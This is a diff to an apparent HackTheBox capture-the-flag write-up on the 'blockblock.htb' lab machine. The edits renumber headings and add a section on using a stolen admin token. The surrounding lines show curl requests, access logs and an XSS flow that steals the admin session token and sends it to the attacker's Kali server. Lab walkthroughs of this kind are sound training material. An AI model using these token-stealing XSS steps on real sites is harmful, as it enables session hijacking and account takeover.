@@ -709,6 +709,8 @@ token=$(curl -s -H 'Content-Type: application/json' -d '{"username": "test", "pa
 
 Trying the `/api/info` endpoint with token:
 
+This API endpoint replies with the caller's token, this can be useful...
+
 ```sh
 root@kali:~# curl -s -H 'Content-Type: application/json' -H "Cookie:token=$token" http://blockblock.htb/api/info | jq
 {
@@ -727,7 +729,7 @@ root@kali:~# curl -s -H 'Content-Type: application/json' -H "Cookie:token=$token
 }
 ```
 
-### 2.4. Cross-site scripting (XSS) on `/api/report_user`
+## 3. Cross-site scripting (XSS) on `/api/report_user`
 
 The action when a user is reported is:
 
@@ -737,7 +739,7 @@ alert(
 );
 ```
 
-#### 2.4.1. Testing for XSS
+### 3.1. Testing for XSS
 
 Start Apache web server and follow (`tail -f`) the `access.log`
 
@@ -768,7 +770,7 @@ The apache access log shows that the target attempted to retrieve `404.js`:
 10.10.11.43 - - [02/Jan/2025:22:00:19 +0800] "GET /404.js? HTTP/1.1" 404 490 "http://10.10.11.43/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/117.0.5938.0 Safari/537.36"
 ```
 
-#### 2.4.2. Retrieve information using XSS
+### 3.2. Retrieve information using XSS
 
 Attempt to get the application to retrieve its own `/api/info` and reflect it to Kali with below code:
 
@@ -793,7 +795,7 @@ The reflection seemed to work, but the response is `/?d=[object%20Object]`:
 10.10.11.43 - - [02/Jan/2025:22:11:08 +0800] "GET /?d=[object%20Object] HTTP/1.1" 200 3383 "http://10.10.11.43/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/117.0.5938.0 Safari/537.36"
 ```
 
-#### 2.4.3. Retrieve information using XSS (Correct type now)
+### 3.3. Retrieve information using XSS (with type corrected)
 
 The returned `[object Object]` (`%20` is URL-encoded for `space`) may mean that the json object was reflected, let's change the code to get `response.text()` instead:
 
@@ -827,3 +829,17 @@ URL-decode the string and formatting back with `jq`:
   "username": "admin"
 }
 ```
+
+## 4. Exploring the Admin session
+
+Edit the token value in the browser:
+
+![image](https://github.com/user-attachments/assets/7510b43b-3036-427d-a4ea-de1df80144f7)
+
+A new `Admin` section pops up after refreshing the home page:
+
+![image](https://github.com/user-attachments/assets/143d2943-db41-4bbd-9f0c-cc60471dedcb)
+
+A user `keira` is found in the users list:
+
+![image](https://github.com/user-attachments/assets/1e424c71-5ba4-4805-9b6c-8e5879d86b2e)
